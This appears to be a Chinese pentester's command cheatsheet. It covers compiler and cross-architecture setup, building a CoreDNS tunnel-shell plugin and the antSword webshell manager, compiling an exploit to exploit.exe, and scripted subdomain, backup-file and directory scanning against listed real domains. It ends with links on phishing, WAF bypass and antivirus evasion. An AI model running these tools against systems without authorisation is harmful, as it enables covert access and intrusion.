# command
收集渗透中会用到的常用命令  。



建议直接[Ctrl+F]查找    



```
#del go path
rm -rf  /usr/local/go/
rm -rf /usr/bin/go
rm -rf /home/gopath/
wget https://go.dev/dl/go1.22.1.linux-amd64.tar.gz
tar -zxvf go1.22.1.linux-amd64.tar.gz -C /usr/local/
ln -s /usr/local/go/bin/go /usr/bin/go

cat >> /etc/profile <<EOF
export GOROOT=/usr/local/go
export GOBIN=$GOROOT/bin
export PATH=$PATH:$GOBIN
export GOPATH=/home/gopath
EOF
mkdir /home/gopath
source /etc/profile
go version

 CGO_ENABLED=0  GOOS=linux  GOARCH=amd64 go build main.go
 CGO_ENABLED=0  GOOS=linux  GOARCH=386 go build main.go
 

 CGO_ENABLED=0  GOOS=windows  GOARCH=amd64 go build main.go
 CGO_ENABLED=0  GOOS=windows  GOARCH=386 go build  main.go

 CGO_ENABLED=0 GOOS=windows GOARCH=amd64 CC=x86_64-w64-mingw32-gcc go build
 CGO_ENABLED=0 GOOS=windows GOARCH=amd64 CC=x86_64-w64-mingw32-gcc go build -ldflags="-s -w"


 CGO_ENABLED=0  GOOS=linux  GOARCH=mips64 go build main.go
 CGO_ENABLED=0  GOOS=linux  GOARCH=mips go build  main.go

```
```
#rust install 
wget https://sh.rustup.rs -O rustup.sh
chmod +x rustup.sh
./rustup.sh
source $HOME/.cargo/env
rustc --version


#制定版本
rustup install 1.60.0
rustup default 1.60.0
rustup default nightly-2022-09-01
rustc --version


uninstall:
rustup self uninstall

rustc --print target-list
rustup target add x86_64-pc-windows-gnu
cargo build --release --target x86_64-pc-windows-gnu
cargo build --release --target x86_64-unknown-linux-musl
cargo build --release --target=mips-unknown-linux-musl 
```


```
#zig build centos 安装

# 必须的依赖
sudo yum install -y curl jq

# 指定版本与架构。
ZIG_VER="0.11.0" # for latest release, use "master"
ZIG_ARCH="x86_64-linux"

zig_xz_url="$(curl -fsL https://ziglang.org/download/index.json \
  | jq -r '.["'"${ZIG_VER}"'"]["'"${ZIG_ARCH}"'"].tarball')"

sudo mkdir -p "/opt/zig/${ZIG_VER}" /opt/zig/
curl -fsL "${zig_xz_url}" \
  | sudo tar -Jx --strip-components=1 -C "/opt/zig/${ZIG_VER}"

# 建立一些链接
sudo ln -sf "/opt/zig/${ZIG_VER}" "/opt/zig/current"
sudo ln -sf "/opt/zig/${ZIG_VER}/zig" "/usr/local/bin/zig-${ZIG_VER}"
sudo ln -sf "/opt/zig/current/zig" "/usr/local/bin/zig"
zig version

#编译程序的一些参数
zig build-exe .\hello-zig.zig -O ReleaseSafe --name hello-zig-Safe
zig build-exe .\hello-zig.zig -O ReleaseFast --name hello-zig-Fast
zig build-exe .\hello-zig.zig  -O ReleaseSmall --name hello-zig-Small

#下面命令编译后只有5k
zig build-exe .\hello-zig.zig  -O ReleaseSmall --name hello-zig-Small  -fstrip -fsingle-threaded

zig build -Dtarget=x86_64-linux-gnu
zig build -Dtarget=x86_64-windows-gnu


```


```
wget https://github.com/coredns/coredns/archive/refs/tags/v1.8.6.tar.gz
tar zxvf v1.8.6.tar.gz && cd coredns-1.8.6


echo tunnelshell:github.com/adc/coredns-tunnelshell >> plugin.cfg
#plugin.cfg hosts:hosts tunnelshell:github.com/adc/coredns-tunnelshell

go get github.com/adc/coredns-tunnelshell
go generate
go build
make

./coredns -plugins

```
```
需要bypass gfw，否则不能下载
wget https://nodejs.org/dist/v6.12.3/node-v6.12.3-x64.msi
git clone https://github.com/pyching/antSword
wget https://github.com/cn6u9/cn6u9.github.io/raw/main/tools/antSword-master.zip
npm install
npm run build
npm start


```




```
apt-get update
apt-get install build-essential make autoconf automake flex bison cmake
apt-get install mingw-w64

i686-w64-mingw32-gcc 40564.c -o exploit.exe -lws2_32 -luser32 -lkernel32 -lgdi32 -ladvapi32 -lshell32 -lcomctl32 -lole32 -loleaut32

-lws2_32: 链接到 Windows Sockets API 库，用于网络编程。

-luser32: 链接到 User32 库，提供用户界面和窗口管理功能。

-lkernel32: 链接到 Kernel32 库，提供系统级功能，如内存管理和文件操作。

-lgdi32: 链接到 Gdi32 库，用于图形设备接口，提供图形绘制和设备管理功能。

-ladvapi32: 链接到 Advapi32 库，提供高级 Windows API 功能，如注册表和服务控制。

-lshell32: 链接到 Shell32 库，用于操作文件和处理用户界面。

-lcomctl32: 链接到 Comctl32 库，提供一些标准的Windows控件。

-lole32: 链接到 Ole32 库，支持 COM（Component Object Model）。

-loleaut32: 链接到 Oleaut32 库，提供对象链接和嵌入库的自动化部分。
```

```
yum groupinstall "Development Tools"
yum install autoconf automake flex bison
yum install mingw32-gcc mingw64-gcc
```

### centos7 and ubuntu19.04 搭建nodejs，npm可以使用nvm 制定版本16，18
```
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.3/install.sh | bash
source ~/.bashrc
nvm install 18
nvm use 18

安装nvm16 版本需要python
sudo yum install bzip2 bzip2-devel -y
cd /usr/local/src
sudo wget https://www.python.org/ftp/python/3.7.9/Python-3.7.9.tgz
sudo tar xzf Python-3.7.9.tgz
cd Python-3.7.9
sudo ./configure --enable-optimizations
sudo make altinstall
```

### 安装编译sing-box ui
```
npm i -g pnpm
go install github.com/wailsapp/wails/v2/cmd/wails@latest
git clone https://github.com/GUI-for-Cores/GUI.for.SingBox.git
cd GUI.for.SingBox/frontend
pnpm install
pnpm build
cd ..
wails build
```
### Usage tuic 需要glibc 2.21以上下面自动下载编译glibc,nvm安装Nodejs 18也要高版本的glibc
```
#aHR0cHM6Ly93cmxvZy5jbi8yMDIyLzEwLzEyODEv
yum install centos-release-scl -y
yum install -y devtoolset-8-gcc devtoolset-8-gcc-c++ devtoolset-8-binutils 
echo "source /opt/rh/devtoolset-8/enable" >> /etc/profile 
source /etc/profile


wget https://ftp.gnu.org/gnu/make/make-4.3.tar.gz 
tar -xzvf make-4.3.tar.gz 
cd make-4.3/ 
./configure --prefix=/usr/local/make 
make 
make install 

cd /usr/bin/ 
mv make make.bak # backup 
ln -sv /usr/local/make/bin/make /usr/bin/make

wget https://ftp.gnu.org/gnu/glibc/glibc-2.28.tar.gz 
tar -xzvf glibc-2.28.tar.gz 
cd glibc-2.28
mkdir build && cd build 
cd /root/glibc-2.28/build 
yum install bison -y
../configure --prefix=/usr --disable-profile --enable-add-ons --with-headers=/usr/include --with-binutils=/usr/bin 
make 
make install

```


# centos7 安装build环境
```

yum -y install git make autoconf gcc gcc-c++ ncurses-devel perl-Thread-Queue patch unzip bzip2 wget time

```
# centos，ubuntu install nim
```
curl https://nim-lang.org/choosenim/init.sh -sSf | sh; echo 'export PATH=/home/tu-nombre-usuario/.nimble/bin:$PATH' >> ~/.bashrc; source ~/.bashrc
```
# debian，mips，arm，x64编译环境
```
apt-get install -y sed make binutils build-essential gcc g++ bash patch gzip bzip2 perl tar cpio python unzip rsync file bc wget g++-multilib
apt install build-essential
apt-get install binutils
sudo apt install gcc-arm-linux-gnueabihf
sudo apt install gcc-mips-linux-gnu

# 编译针对 ARM 架构的程序
arm-linux-gnueabihf-gcc -o output_arm program.c --static -lutil



# 编译针对 MIPS 架构的程序
mips-linux-gnu-gcc -o output_mips program.c --static -lutil

第二种方法
apt-get install linux-libc-dev-mips-cross libc6-mips-cross libc6-dev-mips-cross binutils-mips-linux-gnu gcc-mips-linux-gnu g++-mips-linux-gnu
apt-get install gcc-arm-linux-gnueabihf g++-arm-linux-gnueabihf


```
# 使用docker搭建一个mips的环境,arm环境
```
访问 https://hub.docker.com/r/waveburst/qemu-system-mips

docker pull waveburst/qemu-system-mips
docker run -it -p 5555:5555 waveburst/qemu-system-mips
ssh -p 5555 mips@localhost    pass:mips



docker pull waveburst/qemu-system-armel
docker run -it -p 5565:5565 waveburst/qemu-system-armel
ssh -p 5565 armel@localhost     pass:armel


```
# ubuntu deiban搭建arm，mips，arm32v6,ppc64le,s390x,arm64v8,arm32v7等等
```
curl -fsSL https://get.docker.com | sudo bash
sudo apt-get install qemu binfmt-support qemu-user-static
docker run --rm --privileged multiarch/qemu-user-static --reset -p yes
docker run --rm -t starlabio/docker-arm64v8-centos uname -m


docker run --platform linux/aarch64 --name centos -d -i -t arm64v8/centos /bin/bash
docker attach centos

打开下面地址有使用命令
https://github.com/multiarch/qemu-user-static
docker run --rm -t arm32v6/alpine uname -m
armv7l
docker run --rm -t ppc64le/debian uname -m
ppc64le
docker run --rm -t s390x/ubuntu uname -m
s390x
docker run --rm -t arm64v8/fedora uname -m
aarch64
docker run --rm -t arm32v7/centos uname -m
armv7l
docker run --rm -t ppc64le/busybox uname -m
ppc64le
docker run --rm -t i386/ubuntu uname -m
x86_64

Setting /usr/bin/qemu-alpha-static as binfmt interpreter for alpha
Setting /usr/bin/qemu-arm-static as binfmt interpreter for arm
Setting /usr/bin/qemu-armeb-static as binfmt interpreter for armeb
Setting /usr/bin/qemu-sparc-static as binfmt interpreter for sparc
Setting /usr/bin/qemu-sparc32plus-static as binfmt interpreter for sparc32plus
Setting /usr/bin/qemu-sparc64-static as binfmt interpreter for sparc64
Setting /usr/bin/qemu-ppc-static as binfmt interpreter for ppc
Setting /usr/bin/qemu-ppc64-static as binfmt interpreter for ppc64
Setting /usr/bin/qemu-ppc64le-static as binfmt interpreter for ppc64le
Setting /usr/bin/qemu-m68k-static as binfmt interpreter for m68k
Setting /usr/bin/qemu-mips-static as binfmt interpreter for mips
Setting /usr/bin/qemu-mipsel-static as binfmt interpreter for mipsel
Setting /usr/bin/qemu-mipsn32-static as binfmt interpreter for mipsn32
Setting /usr/bin/qemu-mipsn32el-static as binfmt interpreter for mipsn32el
Setting /usr/bin/qemu-mips64-static as binfmt interpreter for mips64
Setting /usr/bin/qemu-mips64el-static as binfmt interpreter for mips64el
Setting /usr/bin/qemu-sh4-static as binfmt interpreter for sh4
Setting /usr/bin/qemu-sh4eb-static as binfmt interpreter for sh4eb
Setting /usr/bin/qemu-s390x-static as binfmt interpreter for s390x
Setting /usr/bin/qemu-aarch64-static as binfmt interpreter for aarch64
Setting /usr/bin/qemu-aarch64_be-static as binfmt interpreter for aarch64_be
Setting /usr/bin/qemu-hppa-static as binfmt interpreter for hppa
Setting /usr/bin/qemu-riscv32-static as binfmt interpreter for riscv32
Setting /usr/bin/qemu-riscv64-static as binfmt interpreter for riscv64
Setting /usr/bin/qemu-xtensa-static as binfmt interpreter for xtensa
Setting /usr/bin/qemu-xtensaeb-static as binfmt interpreter for xtensaeb
Setting /usr/bin/qemu-microblaze-static as binfmt interpreter for microblaze
Setting /usr/bin/qemu-microblazeel-static as binfmt interpreter for microblazeel
Setting /usr/bin/qemu-or1k-static as binfmt interpreter for or1k
Setting /usr/bin/qemu-hexagon-static as binfmt interpreter for hexagon

```

# shadowsocks-libev 编译环境
```

yum install epel-release -y
yum install gcc gettext autoconf libtool automake make pcre-devel asciidoc xmlto c-ares-devel libsodium-devel mbedtls-devel git -y
```
# 安装python3.7.9
```
mkdir -p /usr/local/python3
cd /usr/local/python3
wget https://www.python.org/ftp/python/3.7.9/Python-3.7.9.tgz
tar -zxvf Python-3.7.9.tgz
cd Python-3.7.9
./configure --prefix=/usr/local/python3
make && make install
ln -s /usr/local/python3/bin/python3 /usr/bin/python3.7
echo "export PATH=$PATH:$HOME/bin:/usr/local/python3/bin" >> ~/.bash_profile
python3.7 -V
```

# 一键信息收集
```
apt install python3 python3-pip &&  pip3 install --upgrade pip


yum install nmap -y
sudo yum groupinstall "Development Tools" && \
sudo yum install -y zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel gdbm-devel db4-devel libpcap-devel xz-devel libffi-devel && \
wget https://www.python.org/ftp/python/3.7.9/Python-3.7.9.tgz && \
tar xzf Python-3.7.9.tgz && \
cd Python-3.7.9 && \
./configure --enable-optimizations && \
make && \
sudo make install && \
python3.7 --version && \
sudo python3.7 -m pip install --upgrade pip


yum -y install centos-release-scl-rh centos-release-scl
yum install -y rh-python38
scl enable rh-python38 bash

yum search python3 | grep devel
yum install -y rh-python38-python-devel.x86_64
yum install -y openssl-devel
yum install -y curl-devel

echo 'source scl_source enable rh-python38' >> ~/.bashrc
python3.8 -m pip install --upgrade pip



cd /opt/ && git clone https://github.com/asaotomo/SearchMap.git
cd /opt/SearchMap/ && pip3.8 install python_nmap python_whois tqdm
#python3.8 searchmap.py -u https://www.wwru.cn/ -s

cd /opt/ && git clone https://github.com/VMsec/ihoneyBakFileScan_Modify.git
cd /opt/ihoneyBakFileScan_Modify/ && pip3.8 install fake-headers && pip3.8 install hurry && pip3.8 install hurry.filesize && pip3.8 install requests
#python3.8 -m pip install -r requirements.txt
#python3.8 ihoneyBakFileScan_Modify.py -u https://www.wwru.cn/  -t 100 -o test.txt

cd /opt/ && git clone https://github.com/maurosoria/dirsearch.git
cd /opt/dirsearch/ && python3.8 -m pip install -r requirements.txt && pip3.8 install urllib3==1.26.7
#python3.8 dirsearch.py -e php,htm,js,bak,zip,tgz,txt -u https://www.wwru.cn/  -t 20

cd /opt/ && git clone https://github.com/lijiejie/BBScan.git
cd /opt/BBScan && pip3.8 install -r requirements.txt
#python3.8 BBScan.py --full -f urls.txt

cd /opt/&& git clone https://github.com/ffuf/ffuf.git
cd /opt/ffuf/ && go build


cd /opt/ && git clone https://github.com/xmendez/wfuzz.git
cd /opt/wfuzz/ && python3.8 -m pip install -r requirements.txt
cd /opt/wfuzz/ && python3.8 setup.py install



#!/bin/bash
#bash script.sh domains.txt
# 确保传递了正确的参数
touch domains.txt
if [ -z "$1" ]; then
    echo "请提供包含域名的文件路径作为参数。"
    exit 1
fi

# 从文件中读取域名列表
domain_file="$1"
websites=()

while IFS= read -r line; do
    websites+=("$line")
done < "$domain_file"

# 循环处理每个域名
for url in "${websites[@]}"; do
    # 创建单独的结果文件
    output_file="results_$url.txt"

    # 功能2: 替换命令中的网址变量
    searchmap_command="cd /opt/SearchMap/ && python3.8 /opt/SearchMap/searchmap.py -u $url "
    ihoney_command="python3.8 /opt/ihoneyBakFileScan_Modify/ihoneyBakFileScan_Modify.py -u $url -t 100 -o $output_file"
    dirsearch_command="python3.8 /opt/dirsearch/dirsearch.py -e php,htm,js,bak,zip,tgz,txt -u $url -t 20 -o $output_file"
    bbscan_command="python3.8 /opt/BBScan/BBScan.py --full -f domains.txt"
    curl -s "https://rapiddns.io/subdomain/$url?full=1#result" | grep "<td><a" | cut -d "/" -f3 | cut -d '"' -f1 | xargs -l2 | sed 's/#result//g'
    # 执行命令并将结果输出到文件
    eval "$searchmap_command" >> "$output_file"
    eval "$ihoney_command" >> "$output_file"
    #eval "$dirsearch_command" >> "$output_file"
    eval "bbscan_command" >> "$output_file"

    echo "网址 $url 的结果已经保存到 $output_file 文件中。"
done

echo "所有域名的结果已经保存到各自的文件中。"

#joomle dr wordpress 
#https://github.com/Tuhinshubhra/CMSeeK
```
# rapiddns 批量查询  
```
git clone https://github.com/rynfixme/rapiddns.git
./rapiddns sameip --address=1.1.1.1
./rapiddns subdomain --domain=www.google.com

#!/bin/bash

# 读取2.txt文件中的每个IP地址
while IFS= read -r ip; do
  # 执行查询并将结果保存到变量result中
  result=$(./rapiddns sameip --address="$ip")

  # 使用jq提取域名和IP地址
  echo "$result" | jq -r '.items[] | "\(.domain) \(.address | gsub("\\n"; ""))"'
done < 2.txt


```
# httpx 编译，批量查看title  
```
git clone https://github.com/projectdiscovery/httpx.git
make

echo "www.baidu.com" | httpx -title -status-code -tech-detect

批量查看title
httpx -title -status-code -tech-detect < 1.txt

端口探测
echo "www.baidu.com" | httpx  -title -status-code -tech-detect -p 80,443,8080 -probe

c段存活探测
echo 127.0.0.0/24 | httpx -silent

fuzz baidu.com的二级域名字典1.5w
wget -q -O - "https://raw.githubusercontent.com/cn6u9/cn6u9/main/gather/subnames.txt"| sed 's/FUZZ/baidu.com/g' | httpx -sc -title -location -t 333

fuzz baidu.com的二级域名字典7.6w
wget -q -O - "https://raw.githubusercontent.com/cn6u9/cn6u9/main/gather/subnames-full.txt"| sed 's/FUZZ/baidu.com/g' | httpx -sc -title -location -t 333

fuzz baidu.com的二级域名字典50w
wget https://raw.githubusercontent.com/krishna-grayhat/subdomain-Finder/main/subdomain.txt 
sed -i 's/$/.FUZZ/' subdomain.txt
cat subdomain.txt | sed 's/FUZZ/baidu.com/g' | httpx -sc -title -location -t 333


根域名爆破 eg:www.baidu.FUZZ
wget -q -O - "https://raw.githubusercontent.com/cn6u9/cn6u9/main/gather/domain-extension.txt"| sed 's/FUZZ/www.baidu/g' | httpx -sc -title -location -t 333


枚举域名，并探测是否存活
subfinder -d baidu.com -silent| httpx -sc -title

```

### 
```
收集的wiki
https://github.com/xiaoy-sec/Pentest_Note/tree/master/wiki
- [个人卫生](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/个人卫生.md)
- [收集信息](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/收集信息/README.md)
  - [域名信息](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/收集信息/域名信息/README.md)
    - [CDN是否存在](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/收集信息/域名信息/CDN是否存在.md)
    - [Bypass CDN](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/收集信息/域名信息/绕过CDN.md)
    - [DNS历史记录](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/收集信息/域名信息/DNS历史记录.md)
    - [SSL证书信息](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/收集信息/域名信息/SSL证书信息.md)
    - [Whois信息](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/收集信息/域名信息/Whois信息.md)
  - [子域名检查](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/收集信息/子域名检查.md)
  - [IP和端口信息](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/收集信息/IP和端口信息/README.md)
    - [ASN](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/收集信息/IP和端口信息/ASN.md)
    - [历史IP](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/收集信息/IP和端口信息/历史IP.md)
    - [NMAP使用](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/收集信息/IP和端口信息/NMAP使用.md)
    - [工具](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/收集信息/IP和端口信息/工具.md)
  - [网站架构和指纹识别](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/收集信息/网站架构和指纹识别.md)
  - [其他信息](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/收集信息/其他信息.md)
  - [人员信息](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/收集信息/人员信息.md)

- [初始访问](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/README.md)
  - [Web服务突破](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/Web服务突破/README.md)
    - [前端](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/Web服务突破/前端.md)
    - [SQL注入](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/Web服务突破/SQL注入/README.md)
      - [判断注入](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/Web服务突破/SQL注入/判断注入.md)
      - [数据库类型识别](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/Web服务突破/SQL注入/数据库类型识别.md)
      - [MSSQL](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/Web服务突破/SQL注入/MSSQL.md)
      - [MYSQL](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/Web服务突破/SQL注入/MYSQL.md)
      - [Oracle](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/Web服务突破/SQL注入/Oracle.md)
      - [PostgreSQL](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/Web服务突破/SQL注入/PostgreSQL.md)
      - [SQLite](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/Web服务突破/SQL注入/SQLite.md)
      - [DB2](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/Web服务突破/SQL注入/DB2.md)
    - [SQLMAP](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/Web服务突破/SQL注入/SQLMAP.md)
    - [XSS](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/Web服务突破/XSS.md)
    - [CSRF](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/Web服务突破/CSRF.md)
    - [PHP包含下载读取](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/Web服务突破/PHP包含下载读取.md)
    - [XML](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/Web服务突破/XML.md)
    - [SSRF](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/Web服务突破/SSRF.md)
    - [DNSLOG](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/Web服务突破/DNSLOG.md)
    - [Xpath注入](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/Web服务突破/Xpath注入.md)
    - [SSTI](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/Web服务突破/SSTI.md)
    - [命令注入](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/Web服务突破/命令注入.md)
    - [PHPMyAdmin利用](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/Web服务突破/PHPMyAdmin利用.md)
    - [PHP-FPM之RCE](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/Web服务突破/PHP-FPM之RCE.md)
    - [PHPstudy后门](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/Web服务突破/PHPstudy后门.md)
    - [IIS写权限](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/Web服务突破/IIS写权限.md)
    - [绕过WAF](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/Web服务突破/绕过WAF.md)
    - [数据库](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/Web服务突破/数据库.md)
    - [命令执行](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/Web服务突破/命令执行.md)
    - [CmdHijack](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/Web服务突破/CmdHijack.md)
    - [Fuzz目录](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/Web服务突破/Fuzz目录.md)
    - [web程序漏洞](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/Web服务突破/web程序漏洞.md)  
    - [编辑器漏洞](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/Web服务突破/编辑器漏洞.md)               
    - [邮件地址payload](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/Web服务突破/邮件地址payload.md)        
    - [从LFI到RCE](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/Web服务突破/从LFI到RCE.md)             
    - [深x服](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/Web服务突破/深x服.md)                         
    - [天r信](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/Web服务突破/tianr.md)                     
    - [Web server日志分析命令](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/Web服务突破/Web-server日志分析命令.md)
    - [默认密码](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/Web服务突破/默认密码.md)  
    - [wso2](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/Web服务突破/wso2.md)  
  - [未授权访问](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/未授权访问/README.md)
    - [Redis](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/未授权访问/Redis.md)
    - [activemq](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/未授权访问/activemq.md)
    - [docker](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/未授权访问/docker.md)
    - [elastic](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/未授权访问/elastic.md)
    - [hadoop](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/未授权访问/hadoop.md)
    - [jboss](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/未授权访问/jboss.md)
    - [jenkins](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/未授权访问/jenkins.md)
    - [memcache](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/未授权访问/memcache.md)
    - [mongo](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/未授权访问/mongo.md)
    - [zookeeper](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/未授权访问/zookeeper.md)
    - [CouchDB](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/未授权访问/CouchDB.md)
    - [Jenkins](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/未授权访问/Jenkins.md)
    - [Solr](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/未授权访问/Solr.md)
    - [VNC](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/未授权访问/VNC.md)
    - [Weblogic](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/未授权访问/Weblogic.md)
    - [Zabbix](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/未授权访问/Zabbix.md)
  - [一些Bypass](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/一些Bypass/README.md)
    - [Linux绕过disable_function](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/一些Bypass/Linux绕过disable_function.md)
    - [Windows系统组件com绕过](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/一些Bypass/Windows系统组件com绕过.md)
    - [cgi启动方式](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/一些Bypass/cgi启动方式.md)
    - [蚁剑绕过](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/一些Bypass/蚁剑绕过.md)
    - [ImageMagick组件绕过](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/一些Bypass/ImageMagick组件绕过.md)
    - [常规函数绕过](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/一些Bypass/常规函数绕过.md)
    - [Open_basedir绕过](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/一些Bypass/Open_basedir绕过.md)
    - [绕过lsa protection](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/一些Bypass/绕过lsa-protection.md)
    - [Bypass mod_security](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/一些Bypass/Bypass-mod_security.md)
  - [TomcatAjp之LFI&RCE](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/TomcatAjp之LFI&RCE.md)
  - [MSSQL&Agent之Job上线](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/MSSQL&Agent之Job上线.md)
  - [MySQL开启外联](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/MySQL开启外联.md)
  - [MySQL连接读取文件](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/MySQL连接读取文件.md)
  - [MySQL不登陆执行命令](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/MySQL不登陆执行命令.md)
  - [近源攻击](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/近源攻击/README.md)
    - [WI-FI破解](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/近源攻击/WI-FI破解.md)
    - [钓鱼网络](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/近源攻击/钓鱼网络.md)
    - [无线干扰](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/近源攻击/无线干扰.md)
    - [BadUSB](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/近源攻击/BadUSB.md)
    - [蓝牙](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/近源攻击/蓝牙.md)
    - [克隆卡](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/近源攻击/克隆卡.md)
  - [鱼叉式攻击](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/鱼叉式攻击/README.md)
    - [钓鱼邮件](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/鱼叉式攻击/钓鱼邮件.md)
    - [钓鱼连接](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/鱼叉式攻击/钓鱼连接.md)
    - [第三方鱼叉](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/初始访问/鱼叉式攻击/第三方鱼叉.md)

- [防御规避](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/防御规避/README.md)
  - [C#源码免杀](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/防御规避/C#源码免杀/README.md)
    - [直接编译](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/防御规避/C#源码免杀/直接编译.md)
    - [CSC+InstallUtil](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/防御规避/C#源码免杀/CSC+InstallUtil.md)
    - [加密处理](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/防御规避/C#源码免杀/加密处理.md)
